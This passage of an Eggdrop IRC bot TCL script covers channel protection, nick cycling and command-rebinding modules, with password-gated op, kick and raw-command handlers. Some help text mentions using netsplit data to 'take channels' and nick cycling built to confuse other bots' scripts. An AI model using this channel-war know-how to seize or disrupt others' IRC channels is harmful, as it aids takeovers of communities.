   as possible.
   Default level is 'low' (for all) but it's suggestable to turn it to
   'medium' or 'high' at least in a few number of bots.
Note1: when no specific channel level is found, default value (for 'all')
       will be used.
Note2: to reset channel specific settings and keep only default ('all')
       for a single channel just type '.prot level \#channel all' or, for
       all chans, '.prot level all all' (or .mprot A level all all').
###  %b.prot fake%b <#channel or all> [all / on / off]
   Enables/disables Anti-Fake protection for specified channel or for
   all; turning this on means that a mass-deop check is performed also
   on registered ops/masters/owners; this will prevent channels from
   fake-based takeovers. On mass-deop detected, the bot will kickban
   deoper, turn protection-level to 'high', enable Extra-Bitch System
   for channel and close it (+mi) for 10 minutes, then it will check
   for Net-Splits and it will unlock channel only when the situation
   is quite. Default is 'off'.
###  %b.prot fakex%b [flag / global|local / - / permowner]
   Exempts specified flags to be target of Anti Fake Mode. Default is 'n'.
###  %b.prot auth%b [password]
   Lets users authenticate to be exempted from Anti-Fake checks in case
   of mass-deop. Authentication is granted on ALL connected bots and
   will expire after the time set using '.prot authtime'.
###  %b.prot authtime%b [minutes#]
   Sets the duration for Anti Fake Exemption granted by '.prot auth'.
   Default is 60 minutes, valid range is: 5 - 720.
###  %b.prot eb%b <#channel or all> [all / off / notice / deop / kick / ban]
   Extra Bitch System, an advanced way to set channels '+bitch': 'off'
   means 'no extrabitch' for that channel (or for 'all' channels);
   'notice' will just send a warning-notice to the oper (after deoping
   the just-oped); 'deop' will deop both oper and just-oped, sending
   a warning-notice to the oper; 'kick' will kick the oper from channel
   after deoping the just-oped; 'ban' will kick-ban for 1 minute the
   oper after deoping the just-oped. Default is off. The message sent in
   warning-notice and kick/kickban can be customized with '.prot ebmsg'.
Note: It is possible to allow users to op manually setting '.prot ebex'.
###  %b.prot ebex%b [flag / global|local / - / permowner]
   Exempts specified flags to be punished by Extra Bitch System.
   Default is 'n|n'.
###  %b.prot ebmsg%b <new-message>
   Lets you personalize the message used by Extra Bitch System to notice
   or kick/kickban transgressors.
###  %b.prot leb%b <#channel or all> [all / off / notice / deop / kick / ban]
   Limit Extra Bitch System, notices (or deops/kicks/bans) users which
   change channel limit manually.
See also: .prot lebex
###  %b.prot lebex%b [flag / global|local / - / permowner]
   Exempts specified flags to be punished by Limit Extra Bitch System.
   Default is 'm|m'.
###  %b.prot timeout%b <seconds#> or %boff%b
   When a protected user is kicked off, bot will invite him on
   channel or give him the key to join channel; if he rejoins channel
   before the specified number of seconds he will be reoped also.
   Default value is 12 seconds; it's suggestable to keep this number
   low to prevent fake nicks joining channel in case of victim quit.
   Valid range is: 3 - 30 seconds.
###  %b.prot split%b <minutes#> or %boff%b
   When a netsplit is detected, protection level can be automatically
   turned to 'nightmare' and Extra Bitch System enabled to prevent possible
   takeovers: this value determines how much time protections will remain
   at the maximum level. By default this feature is disabled. If you
   want to enable it, just set this time in the range 5-180 minutes.
   Default is 10 minuts.
Note: this feature works only on channels with protection level >= medium.
###  %b.prot collide%b <seconds#> or %boff%b
   When netsplit-protection is enabled (.prot split <value != 0>), and
   only if 'nick' module is loaded (.msetup A nick load), bots can enable
   smart nick-cycling to prevent nick-collide attaks; they will change
   their nicks every <seconds#>. If a timegap is set on 'nick' module
   (.nick gap <gap_seconds#>), a random gap <= gap_seconds# will also
   be added to this time to prevent bots from flooding channels whith a
   synchronous nick-change. Valid range for <seconds#> is 60 - 600.
   Default is off (disabled). Default gap in nick-module is 0.
###  %b.prot notice%b <#channel or all> %bon%b / %boff%b
   When netsplit protection is enabled (.prot split <value != 'off'>) or
   Anti-Fake System is enabled (.prot fake <#channel / all> on), bots
   can send to channels a notice to prevent users from dangerously
   playing with ops. Bots will also notice channels when netsplit alarm
   (or TakeOver alarm) is ended. By default this is disabled to prevent
   a notice flood in large botnets; it's suggestable to turn it on in a
   few number of bots.
###  %b.prot banlist%b <#channel or all> %bon%b / %boff%b
   Enables or disables banlist checking: while enabled, if too many bans
   are detected for a particular channel, this is locked with a +mi and
   a notice is sent to all available operators esorting them to clean
   banlist. Default is off.
###  %b.prot bantime%b <minutes#>
   If protection level is set to 'nightmare', deopers (or kickers)
   will be punished with a kickban; this command sets ban lifetime.
   It also sets ban lifetime for flooders (flood protections are
   always enabled, excluding channels with level 'off').
   Default is 10 minutes. Valid range is: 3 - 30 minutes.
###  %b.prot msg%b [newmsg]
   Sets the message to put in the notice or in the kick after
   user punishement (protection level >= low).
Note:  you can use '%%nick' as special tag to put in your message
       victim nick. Ie. if msg is set to 'Never touch %%nick !'
       and user ^Boja^ is deoped, the transgressor will be noticed (or
       deoped, kicked or kickbanned) with the message 'Never touch
       ^Boja^ !'.
###  %b.prot limit%b <all / #channel> [all / off / <joins# minutes#>]
   The Limiting System protects channels from mass-joins, setting a
   dynamic chanlimit (+l); you can set different parameters for
   different kind of channels: for a channel with no more than 10
   people it's right to set a limiting up to 5 joins in 3 minutes,
   in a high-traffic channel with 200 or more people it's
   suggestable to allow at least 10 joins in 2 minutes. When no
   specific channel settings are found, default value (for 'all)
   is used. By default this feature is disabled (set to 'off').
   For example: to allow 7 joins in 3 minutes on channel \#test, type
   '.prot limit \#test 7 3', to disable limiting on channel \#test2,
   '.prot limit \#test2 off' and to reset values for all channels
   to the default ('all'), '.prot limit all all'..
Note: it's highly recommended to enable this feature on more than
      1 bot, to mantain a dynamic limiting in case of disconnection
      or crash of actual bot! (You can use the mass interface,
      '.mprot botname limit \#channel joins\# minutes\#' to enable
      or disable it on remote bots).
See also: .splits, .repeat, .clone, .spam, .nick, .tlock, .clear
%{help=splits}%{+t|+m}
###  %b.splits%b
   Shows a list of servers under netsplit. Helpfull when you need
   to take channels.
###  %b.splits log%b
   Shows the logfile containing the list of last netsplits detected.
###  %b.splits clear%b
   Removes the NetSplits logfile.
See also: .prot, .eb, .servers, .clear
%{help=limit}%{+m|+m}
###  %b.limit%b <all / #channel> [all / off / <joins# minutes#>]
   Just another bind to '.prot limit'..
See also: .prot, .mprot
%{help=eb}%{+m|+m}
###  %b.eb%b
   Extra Bitch System, now integrated as '.prot eb'.
   See '.help prot' for detailed informations.
See also: .prot
###  %b.mprot A/X/Y/Z/../botname1,botname2,botnameN%b <command> <newvalue>
   Changes the specified Nick System command to the new specified
   value on ALL connected bots ( A ), or only on X, Y, or Z flagged
   bots, or only on the specified bot(s)..
Note: for a list of valid commands, see '%b.help nick%b'..
See also: .nick, .botnick, .prot
%{help=mprot}%{+m|+m}
###  %b.mprot%b ...
   Standard Mass interface for Smart Protector Module.
See also: '.help mass'
}
set smart_nick {set m "nick"
global bnick ${m}_module_name ${m}_module_init ${m}_module_bind ${m}_module_loaded ${m}_noconf_commands
global botnick botname nick_rpat nick_bc nick_cmap nick nick_cycle_ori nick_time_ori nick_c
set ${m}_module_name "Nick Management"
set ${m}_module_bind "m|m"
set ${m}_help_list "{dcc $m m|m} {dcc m${m} m|m} {dcc botnick m|m}"
# {0=var_name 1=read-only_flag 2=value 3=description 4=kind 5=override_flags 6=notes 7=no-log_flag}
set ${m}_module_init {
    {ver 1 "1.2" "Version"}
    {author 1 "^Boja^ <boja@avatarcorp.org>" "Author"}
    {ori 0 "default" "Original Nickname" "%n:default" n "If you are lazy, use this setting instead of changing 'set nick nickname' in your .conf! ;)"}
    {len 0 "auto" "Max Nick Length" "%d:5 32|auto" n "Warning! Change only if you experience bogus calculation!"}
    {cycle 0 "off" "Nick Cycling" "%k:off smart random list pattern" n}
    {time 0 60 "Cycling time" "%d:15 7200|random" n "Warning! Setting this < 30 will result in k:lines risk for nick-flood and bot lag.."}
    {gap 0 "off" "Cycle Time Gap" "%d:5 300|off" n}
    {lsort 0 "random" "Cycle List Sort" "%k:random list" n}
    {list 1 "<empty>" "Cycling Nick List" "" n}
    {pattern 0 "Smart-%x%x%x" "Nick Pattern" "" n "Valid meta-characters are: %b, %c, %d, %n, %x."}
    {rpat 1 "<none>" "Resolving Pattern"}
}
#cmd single nolog
set ${m}_noconf_commands {
    add del clearlist
}
module_init $m ; eval [module_globals $m]

set nick_bc "\[\]\\\{\}" ; set nick_cmap "{a 4} {b 8} {e 3} {g 9} {l 1} {o 0} {s 5} {z 7}"

proc ${m}_what_script {h m v a n w} {
    global nick botnick ; eval [module_globals $m] ; set r ""
    switch -exact -- $v {
	"ori" {
	    if {[lsearch -exact "info status" $w] != -1 && $nick_ori == "default"} {
		set r "(current:[c m] $nick[c])"
	    }
	}
	"pattern" {
	    if {$w == "parse"} { set r "pattern" } else {
		if {$w == "status"} { set r "(like:[c m] [nick:resolve_pattern][c])" }
	    }
	}
	"time" { set r "seconds" }
	"gap" { if {$nick_gap != "off" || $w == "parse" } { set r "seconds" } }
	"len" {
	    if {$nick_len != "auto" || $w == "parse" } { set r "chars" }
	    if {[lsearch -exact "status info" $w] != -1 && $nick_len == "auto"} {
		set l [nick_max_length] ; set N [bi $l 0] ; set L [bi $l 1]
		append r "($N[c m] $L[c] chars)"
	    }
	}
	"cycle" {
	    if {[lsearch -exact "info status" $w] != -1 && $nick_cycle != "off"} {
		set r "(current nick:[c m] $botnick[c])"
	    }
	}
	default {}
    }
    return $r
}
proc nick_max_length {} {
    global net-type
    switch -exact -- ${net-type} {
	0       { return "EFNet: 9" }
	1       { return "IRCNet: 9" }
	2       { return "UnderNet: 9" }
	3       { return "DALNet: 32" }
	4       { return "Hybrid: 9" }
	default { return "Other: 9" }
    }
}
proc nick:set_length {} {
    global nick_len nick-len
    if {$nick_len == "auto"} { set nick-len [bi [nick_max_length] 1] } else { set nick-len $nick_len }
}
proc rand_bc {} { global nick_bc ; return [lindex [split $nick_bc ""] [rand [string length $nick_bc]]] }
proc nick:make_rpat {} {
    global nick_rpat nick_pattern ; set p $nick_rpat
    if {$p == "<none>"} { set p $nick_pattern } ; regsub -all -- "%n" $p 0 p
    if {$nick_rpat != $p} { set nick_rpat $p ; module_save nick }
}
proc nick:resolve_pattern {} {
    global nick nick_rpat ; set p $nick_rpat
    regsub -all "%b" $p $nick p
    while {[string match "*%*" $p]} {
	regsub -- "%c" $p [rw 1 char] p ; regsub -- "%d" $p [rand_bc] p
	regsub -- "%n" $p 0 p ; regsub -- "%x" $p [rand 10] p
    }
    return $p
}
proc strfmt {s n} { while {[string length $s] < $n} { set s "0$s" } ; return $s }
proc nick:botnet_rpat {h i G p} {
    global bnick nick_rpat ; set np $p
    set n 0 ; set I 0 ; while {[string match "*%n*" $p]} { regsub "%n" $p 0 p ; incr n }
    foreach b $G {
	set p $np ; set j 0 ; set q [strfmt $I $n] ; incr I
	while {[string match "*%n*" $p]} { regsub "%n" $p [string index $q $j] p ; incr j }
	if {$b == $bnick} {
	    set nick_rpat [p_test $p] ; module_save nick
	} else { putbot $b "nick $h $i rpat $p" }
    }
}
proc can_to_n {s} {
    global nick_cmap
    foreach c $nick_cmap { if {[string match *[lindex $c 0]* [strl [string range $s 1 end]]]} { return 1 }}
    return 0
}
proc can_to_s {s} {
    global nick_cmap
    foreach c $nick_cmap { if {[string match *[lindex $c 1]* [strl $s]]} { return 1 } } ; return 0
}
proc char_to_num {s} {
    global nick_cmap ; set q [split [string range $s 1 end] ""]
    foreach c $nick_cmap {
	set C [lindex $c 0] ; set n [lsearch -exact [strl $q] $C]
	if {$n != -1} { set q [lreplace $q $n $n [lindex $c 1]] ; break }
    }
    set s "[string index $s 0][join $q]" ; regsub -all " " $s "" s ; return $s
}
proc num_to_char {s} {
    global nick_cmap
    foreach c $nick_cmap {
	set C [lindex $c 1] ; if {[string match *$C* $s]} { regsub $C $s [lindex $c 0] s ; return $s }
    }
    return $s
}
proc nick:list_autogen {} {
    global nick altnick nick_list nick-len nick_bc ; set l $nick
    if {[info exists altnick] && $altnick != ""} { lappend l $altnick }
    set n $nick ; set r [expr ${nick-len} - [string length $n]]
    while {$r > 0} {
	if {[rand 2]} { append n [rand_bc] } else { set n [rand_bc]$n }
	if {[lsearch -exact $l $n] == -1} { lappend l $n ; incr r -1 }
    }
    set n $nick ; while {[can_to_n $n]} { set n [char_to_num $n] ; lappend l $n }
    set n $nick ; while {[can_to_s $n]} { set n [num_to_char $n] ; lappend l $n } ; return $l
}
proc nick:ori_check {} { global nick nick_ori ; if {$nick_ori != "default"} { set nick $nick_ori } }
set nick_c 0
proc nick:c_list {} {
    global nick_lsort nick_list nick_c
    if {$nick_list == ""} {
	al nick "[module_name nick] Nick List is empty: auto-generating a new list.."
	set nick_list "[nick:list_autogen]" ; module_save nick
    }
    if {$nick_lsort == "random"} {
	putquick "NICK [join [bi $nick_list [rand [llength $nick_list]]]]"
    } else {
	putquick "NICK [join [bi $nick_list $nick_c]]" ; incr nick_c
	if {$nick_c >= [llength $nick_list]} { set nick_c 0 }
    }
}
proc nick:c_smart {} {
    global nick-len ; set x [rand 7] ; set n "[rw 1 c]"
    switch -exact -- $x {
	0 - 1 { 
	    set f $x ; if {$f} { set n "[rand_bc]" }
	    while {[string length $n] < ${nick-len}} {
		if {$f} { append n "[rw 1]" ; set f 0 } else { append n [rand_bc] ; set f 1 }
	    }
	}
	2 - 3 {
	    if {[expr $x - 2]} {
		append n "[rw [expr ${nick-len} / 2 - 1]]"
		while {[string length $n] < ${nick-len}} { append n "[rand_bc]" }
	    } else {
		set n "" ; while {[string length $n] < [expr ${nick-len} / 2]} { append n "[rand_bc]" }
		append n [rw [expr ${nick-len} - [string length $n]]]
	    }
	}
	4 - 5 {
	    set y [rand ${nick-len}]
	    if {$y < 2 } { set y 2 } ; if {$y > [expr ${nick-len} - 3]} { set y [expr ${nick-len} - 3] }
	    if {[expr $x - 4]} {
		append n "[rw $y]" ; while {[string length $n] < ${nick-len}} { append n "[rand_bc]" }
	    } else {
		set n "" ; while {[string length $n] < $y} { append n "[rand_bc]" }
		append n [rw [expr ${nick-len} - [string length $n]]]
	    }
	}
	default { set n "" ; while {[string length $n] < ${nick-len}} { append n "[rand_bc]" } }
    }
    putquick "NICK $n"
}
proc nick:c_random {} {
    global nick-len; set n [rw 1 c]; append n [rw [expr ${nick-len} -1]]; putquick "NICK $n"
}
proc nick:c_pattern {} { global nick_rpat ; putquick "NICK [nick:resolve_pattern]" }
proc nick:check {} {
    global nick_cycle nick_time nick_gap nick keep-nick ; set keep-nick 0
    foreach t [utimers] { if {[string match *nick:check* [lindex $t 1]]} { killutimer [lindex $t 2] } }
    switch -exact -- $nick_cycle {
	"smart" - "random" - "pattern" - "list" { nick:c_$nick_cycle }
	default {
	    if {$nick_cycle != "off"} {
		al nick "[c e]Unknown[c] '.nick cycle' option:[c e] [b]$nick_cycle[b][c]: disabling System"
		set nick_cycle "off" ; module_save nick
	    }
	    set keep-nick 1 ; putquick "NICK $nick"
	}
    }
    if {$nick_cycle != "off"} {
	set t $nick_time ; if {$nick_gap != "off"} { set t [expr $t + [rand [expr $nick_gap + 1]]] }
	utimer $t nick:check
    }
}
proc dcc:botnick {h i a} { global lastbind ; set lastbind "nick" ; dcc:module_interface $h $i "ori $a" }
bind dcc $nick_module_bind botnick dcc:botnick
proc ${m}_module_setup {h i m l G g w p} {
    global pa bnick ${m}_auth ; set a [module_array_vars $m] ; eval [module_globals $m] ; set pa($i) $m
    #al "testing ${m}_module_setup" "h=$h, i=$i, m=$m, l=$l, G=$G, g=$g, w=$w, p=$p, array_vars=$a"
    switch -exact $w {
	"add" - "del" {
	    if {$p == ""} { pa $i "Usage: .$m $w <nickname>" ; return 0 }
	    set n [lsearch -exact $nick_list [join $p]]
	    if {!$l || ($l && [lsearch -exact [strl $G] [strl $bnick]] != -1)} { set o 1 } else { set o 0 }
	    if {$w == "add"} {
		if {$o && $n != -1} {
		    if {$l} { pa $i "Nick '[c e][join $p][c]' is already listed! Try '[c m].$m list[c]'!" }
		    return 0
		}
		if {$o} {
		    if {$l} { set P $p } else { set P [join $p] }
		    if {$nick_list == "<empty>"} { set nick_list $P } else { append nick_list " $P" }
		}
		set q1 "Added" ; set q2 "to"
	    } else {
		if {$o && $n == -1} {
		    if {$l} { pa $i "Nick '[c e][join $p][c]' is not in list: try '[c m].nick list[c]'!" }
		    return 0
		}
		if {$o} { set nick_list [lreplace $nick_list $n $n] } ; set q1 "Removed" ; set q2 "from"
	    }
	    if {$o} { module_save nick } ; set q "$q1 nick '[c o][join $p][c]' $q2 Nick List"
	    if {$l} {
		if {[strl $g] == [strl $bnick]} { set Q "" } else { set Q "on $g" }
		if {$Q != ""} { append q " $Q" } ; append q ": Authorized by $h."
	    } else { append q ": requested by $h (from $G)" }
	    al $m $q
	}
	"clearlist" {
	    if {!$l || ($l && [lsearch -exact [strl $G] [strl $bnick]] != -1)} { set o 1 } else { set o 0 }
	    set q "Cleared [c m]Nick List[c] " ; if {$o} { set nick_list "<empty>" ; module_save nick }
	    if {$l} {
		if {[strl $g] == [strl $bnick]} { set Q "" } else { set Q "on $g" }
		if {$Q != ""} { append q " $Q" } ; append q ": Authorized by $h."
		pa $i "To rebuild your Nick List, you can use '[c m].$m add <nick>[c]' or '[c m].rehash[c]' (to rebuild default nicks).."
	    } else { append q ": requested by $h (from $G)" }
	    al $m $q
	}
	default {
	    module_save_changes $h $i $m $l $G $g $w $p $a
	    switch -exact -- $w {
		"ori"     { nick:ori_check }
		"len"     { nick:set_length }
		"pattern" { if {$l} { nick:botnet_rpat $h $i $G $p } }
		"cycle"   { nick:check }
		default   {}
	    }
	}
    }
}
nick:set_length ; nick:make_rpat ; nick:ori_check
if {$nick_list == "<empty>"} { set nick_list "[nick:list_autogen]" ; module_save nick } ; nick:check
al init "[module_name $m] (version [expr $${m}_ver]) loaded and ready!"; set ${m}_module_loaded 1; unset m}
set smart_nick_help {%{help=nick}%{+m|+m}
###  %b.nick%b
   Standard Interface to Nick Management Module.
   Displays module status and saved settings.
See also: .mnick
###  %b.nick -v%b
   Displays module status, complete command list and quick-help.
###  %b.nick ver%b
   Displays Nick Management Module version.
###  %b.nick author%b
   Displays informations about Module Author.
###  %b.nick clear%b
   Removes Nick Management configuration file.
See also: '.help clear'
###  %b.nick ori%b [nickname / default]
   Lets you permanentely set Original bot's nickname. This
   will set the variable 'nick' overriding any previous setting
   made in your bot 's .conf file. If you revert to 'default',
   you have to '.rehash' your bot to make changes take effect.
###  %b.nick cycle%b [off / smart / random / list / pattern]
   Sets nick cycling method: off = no cycling, smart = use a
   smart algorithm generating random nicks with introduction of
   bad characters which makes it hard for other TCLs to handle
   our nicknames, random = random alphanimeric nicknames, list =
   use nick-list (see .nick list / .nick add / .nick del),
   pattern = use pattern (see .nick pattern).
###  %b.nick time%b [seconds#]
   Sets nick cycling time. Accepted range is: 15 - 7200 seconds
   (15 seconds - 2 hours). Default is 60 seconds.
###  %b.nick gap%b [seconds# / off]
   Sets a random timegap which will be added to cycling-time to
   make the nick cycling asynchronous through the botnet. Valid
   range is 5 - 300 seconds. Default is 'off' (no random gap).
###  %b.nick len%b [max-len / auto]
   Lets you set the maximum nick-length to use. Warning! This is
   a very dangerous command: setting an invalid length will
   result in truncated or malformed IRC nicknames! Default depends
   on the netword you are using (IRCNet = 9 char, DALNet = 32, ..).
   To autoconfigure this parameter, use '.nick len auto'.
###  %b.nick list%b
   Shows actual Nick List.
###  %b.nick clearlist%b
   Clears current Nick List. You can then add new nicknames using
   '.nick add <newnick>' or rebuild an auto-generated Nick List
   with a simple '.rehash'.
###  %b.nick lsort%b [random / list]
   Sets sorting kind for 'list' cycling method: random means
   that nicks are changed using random Nick List positions,
   'list' means that nicks will be changed sequentially,
   following the original list sorting. Default is 'random'.
###  %b.nick pattern%b [pattern]
   Sets a particular nick-pattern. Pattern is a string which can
   contain normal chars and metacharacters (metachars are used
   to obtain specific nick compositions). Valid metachars are:
   '%b%%b%b': will be replaced by original bot's nickname.
   '%b%%c%b': replaced by a random character.
   '%b%%d%b': replaced by a dangerous character (randomly).
   '%b%%x%b': replaced by a random number (can NOT be first char).
   '%b%%n%b': replaced by an ordered number. If used with single
         interface, this will produce everytime a '0', while with
         mass interface (.mnick A pattern base-%%n%%n%%n) will
         generate an ordered botnet nick configuration (base-000,
         base-001, base-002,...).
Note: In mass mode, all metacharacters except '%%n' are compiled at
      runtime by destination bos, while the '%%n' is semi-compiled
      when '.mnick X pattern xxx' command is sent.
See also: '.nick rpat', .mnick, .botnick
###  %b.nick rpat%b
   Shows Resolving Pattern, a semi-compiled version of '.nick pattern'
   with all '%%n' metacharacters resolved. This is usefull to have a
   preview of an ordered-pattern botnet (try '.mnick A rpat' to see
   all '%%n' metacharacters resolved).
%{help=mnick}%{+m|+m}
###  %b.mnick%b ...
   Standard Mass interface for Nick Management Module.
See also: '.help mass'
%{help=botnick}%{+m|+m}
###  %b.botnick%b <newnick>
   Just another bind to '.nick ori'..
See also: .nick, .mnick, .handle}
set smart_bind {set m "bind"
global bnick ${m}_module_name ${m}_module_init ${m}_module_bind ${m}_module_loaded ${m}_noconf_commands
set ${m}_module_name "Bind Customisation"
set ${m}_module_bind "m|m"
set ${m}_help_list "{dcc $m m|m} {dcc m${m} m|m}"
# All module vars: {0=name 1=read-only 2=value 3=desc 4=kind 5=override_flags 6=notes 7=no-logs_flag}
set ${m}_module_init {
    {ver 1 "1.0" "Version"}
    {author 1 "^Boja^ <boja@avatarcorp.org>" "Author"}
    {msg(op) 0 "op" "MSG Command" "::%k:op deop kick invite ident chat pass raw" permowner}
    {msg(deop) 0 "deop" "MSG Command" "::%k:op deop kick invite ident chat pass raw" permowner}
    {msg(kick) 0 "kick" "MSG Command" "::%k:op deop kick invite ident chat pass raw" permowner}
    {msg(invite) 0 "invite" "MSG Command" "::%k:op deop kick invite ident chat pass raw" permowner}
    {msg(ident) 0 "newident" "MSG Command" "::%k:op deop kick invite ident chat pass raw" permowner}
    {msg(chat) 0 "chatme" "MSG Command" "::%k:op deop kick invite ident chat pass raw" permowner}
    {msg(pass) 0 "pass" "MSG Command" "::%k:op deop kick invite ident chat pass raw" permowner}
    {msg(raw) 0 "raw" "MSG Command" "::%k:op deop kick invite ident chat pass raw" permowner}
    {dcc(tcl) 0 "tclz" "DCC Command" "::%k:tcl set die dump" permowner}
    {dcc(set) 0 "-" "DCC Command" "::%k:tcl set die dump" permowner}
    {dcc(die) 0 "-" "DCC Command" "::%k:tcl set die dump" permowner}
    {dcc(dump) 0 "dump" "DCC Command" "::%k:tcl set die dump" permowner}
}
# format: {command single-only-interface_flag no-logs_flag}
set ${m}_noconf_commands {
    
}

module_init $m ; eval [module_globals $m]

proc ${m}_what_script {h m v a n w} {
    eval [module_globals $m] ; set r ""
    switch -exact -- $w {
	"parse" { if {[lsearch -exact "msg dcc" $v] != -1} { set r "new-bind / -" } }
	default {
	    if {[lsearch -exact "msg dcc" $v] != -1} {
		set B bind_$v ; set b [expr $${B}($a)] ; if {$b == "-"} { set r "(disabled)" }
	    }
	}
    }
    return $r
}
proc msg:oldbind {n uh h a} {
    global lastbind botnick
    al bind "Received '[c e]/MSG $botnick [b]$lastbind[b] ...[c]' from $n ($uh): command rebinded!"
}
proc dcc:oldbind {h i a} {
    global lastbind ; al bind "Received '[c e].[b]$lastbind[b] ...[c]' from $h: command rebinded!"
}
proc bind:change {k} {
    set B bind_$k ; global $B
    foreach b [array names $B] {
	bind $k - $b $k:oldbind ; set n [expr $${B}($b)] ; if {$n != "-"} { bind $k - $n $k:$b }
    }
}
bind msg - chatme msg:oldbind ; bind msg - newident msg:oldbind ; # to prevent seeing passwords in pl
bind:change msg ; bind:change dcc
proc msg:op {n uh h a} { *msg:op $n $uh $h $a }
proc msg:deop {n uh h a} {
    if {![matchattr $h o]} { return 0 }
    set p [bi $a 0] ; set c [bi $a 1] ; set w [bi $a 2]
    if {$c == "" || ![flagged $h o $c]} { return 0 }
    if {$w == ""} { putnotc $n "[boja] - Usage: !deop <password> <\#channel> <nick>" ; return 0 }
    if {![passwdok $h $p]} {
	al "security alert" "$n supplied a wrong password for !deop"
	putnotc $n "[boja] - Wrong password, attempt has been logged." ; return 0
    }
    if {![validchan $c]} { putnotc $n "[boja] - Sorry, I don 't monitor $c." ; return 0 }
    if {![botonchan $c] || ![botisop $c]} { putnotc $n "[boja] - I can 't help you now, please retry later!" ; return 0 }
    set wh [nick2hand $w $c]
    if {([matchattr $wh m] || [matchattr $wh b]) && ![matchattr $h n]} {
	putkick $c $n "[boja] - Dont fuck with $wh"
	al "security alert" "$h ( $n!$uh ) tried to make me deop [b]$wh[b] on $c" ; return 0
    }
    pushmode $c -o $w
}
proc msg:kick {n uh h a} {
    set p [bi $a 0] ; set c [bi $a 1] ; set w [bi $a 2]; set r [br $a 3 end]
    if {$c == "" || ![flagged $h o $c]} { return 0 }
    if {$w == ""} { putnotc $n "[boja] - Usage: !kick <password> <\#channel> <nick> \[reason\]" ; return 0 }
    if {![passwdok $h $p]} {
	al "security alert" "$n supplied a wrong password for !kick"
	putnotc $n "[boja] - Wrong password, attempt has been logged." ; return 0
    }
    if {![validchan $c]} { putnotc $n "[boja] - Sorry, I don 't monitor $c." ; return 0 }
    if {![botonchan $c] || ![botisop $c]} { putnotc $n "[boja] - I can 't help you now, please retry later!" ; return 0 }
    set wh [nick2hand $w $c]
    if {([matchattr $wh m] || [matchattr $wh b]) && ![matchattr $h n]} {
	putkick $c $n "[boja] - Dont fuck with $wh"
	al "security alert" "$h ( $n!$uh ) tried to make me kick [b]$wh[b] on $c" ; return 0
    }
    if {$r == ""} { set r "[boja] - And don't come back!" } ; putkick $c $w $r
}
proc msg:invite {n uh h a} {
    set p [bi $a 0] ; set c [bi $a 1]
    if {($c == "" && ![flagged $h o]) || ($c != "" && ![flagged $h o $c])} { return 0 }
    if {![validuser $h]} { return 0 }
    if {$p == ""} { putnotc $n "[boja] - Usage: !invite <password> \[\#channel\]" ; return 0 }
    if {![passwdok $h $p]} {
	al "security alert" "$n supplied a wrong password while trying !invite"
	putnotc $n "[boja] - Wrong password, attempt has been logged." ; return 0
    }
    if {$c == ""} {
	al notice "Invited $h ( $n!$uh ) to all active channels."
	putnotc $n "Inviting you to all active channels, $n !"
	foreach C [channels] { putquick "INVITE $n $C" } ; return 0
    }
    if {![validchan $c]} { putnotc $n "Sorry, I don 't monitor $c !" ; return 0 }
    if {![onchan [boat] $c] || ![botisop $c]} {
	putnotc $n "I can't help you now, please retry later!" ; return 0
    }
    putnotc $n "Inviting you to $c" ; al notice "Invited $h ( $n!$uh ) to all active channels."
    putquick "INVITE $n $c"
}
proc msg:ident {n uh h a} {
    set p [bi $a 0] ; set H [bi $a 1]
    if {$H == ""} {set H $h}
    if {![passwdok $H $p]} { al security "Failed ID from $n ($uh) : bad password." ; return 0 }
    if {$h != "*"} { putnotc $n "[boja] - I recognize you as $h ! ;)" ; return 0 }
    if {[passwdok $H $p]} {
	addhost $H [wmh $uh] ; save
	if {[matchattr $H b]} {
	    al security "($n!$uh) since when can bots like $H identify via message? :o?" ; return 0
	}
	al security "Added [b][wmh $uh][b] to $H (ID succeeded)."
	putnotc $n "[boja] - Access granted for $H as [wmh $uh]"
	if {[matchattr $H p]} {
	    putnotc $n "[boja] - Please, now join party-line and do a '[b].whois $H[b]' to check that all is ok ! ;)"
	}
    }
}
proc msg:chat {n uh h a} {
    global all_port users_port lastbind
    if {![validuser $h]} {
	putquick "NOTICE $n :[boja] - I don't recognize you.. :("
	al security "Rejected CHAT-request from [c e] unknow user[c]: $n!$uh : ignoring.." ; return 0
    }
    if {![matchattr $h p]} {
	putnotc $n "[boja] - Sorry, you need the +p flag to join partyline.. :("
	al security "Rejected CHAT-request from $h ($n!$uh): [c e]not +p user[c].." ; return 0
    }
    set p [bi $a 0]
    if {$p == ""} { putnotc $n "[boja] - Usage: $lastbind <password>" ; return 0 }
    if {![passwdok $h $p]} {
	putnotc $n "[boja] - Wrong password, attempt has been logged"
	al security "Rejected CHAT-request from $h ($n!$uh): [c e]bad password[c]" ; return 0
    }
    set o 0
    if {[info exists users_port] || [info exists all_port]} {
	set o 1 ; if {[info exists users_port]} { set up $users_port } else { set up $all_port }
    }
    if {!$o} {
	putnotc $n "[boja] - Sorry, I can 't open a valid port for your connection.. :("
	al "error" "Could not DCC-CHAT $n ($h): error opening [c e]listen-port[c].. :(" ; return 0
    }
    putserv "PRIVMSG $n :\001DCC CHAT chat [myip] $up\001"
    al bind "[c o]Accepted CHAT-request[c] from $h ( $n!$uh ) : DCC'ing.."
}
proc msg:pass {n uh h a} { *msg:pass $n $uh $h $a }
proc msg:raw {n uh h a} {
    if {![flagged $h n]} { return 0 } ; set p [bi $a 0] ; set w [br $a 1 end]
    if {$w == ""} { putnotc $n "[boja] - Usage : !raw <password> <text>" ; return 0 }
    if {![passwdok $h $p]} {
	al "security alert" "$n supplied a wrong password for !raw"
	putnotc $n "[boja] - Wrong password, attempt has been logged." ; return 0
    }
    putnotc $n "Executed RAW command: $w" ; putserv $w
}
proc dcc:tcl {h i a} {
    global pa lastbind errorInfo ; set pa($i) security
    if {[bi $a 0] == ""} { pa $i "Usage : .$lastbind <tcl-commands>" ; return 0 }
    al security "Executing direct TCL command: [b]$a[b]: Authorized by $h."
    if {[info exists errorInfo] && $errorInfo != ""} { set e 1 ; set o $errorInfo } else { set e 0 }
    set errorInfo "" ; *dcc:tcl $h $i $a
    if {![info exists o]} { set o "" } ; set errorInfo $o
}
proc dcc:set {h i a} { *dcc:set $h $i $a }
proc dcc:die {h i a} { *dcc:die $h $i $a }
proc dcc:dump {h i a} { *dcc:dump $h $i $a }
proc bind:help {i a} {
    global bind_msg ; set b [lindex $a 1]
    foreach n [array names bind_msg] { if {$bind_msg($n) == $b} { break } } ; return ".help msg_$n"
}
set ${m}_help_list "{dcc $m m|m} {dcc m${m} m|m}"
foreach k "msg dcc" {
    set B ${m}_$k ; global $B
    foreach b [array names $B] {
	switch -exact -- $b {
	    "op" - "deop" - "kick" - "invite" { set f "o|o" }
	    "ident" - "pass" { set f "-" }
	    "chat" { set f "p" }
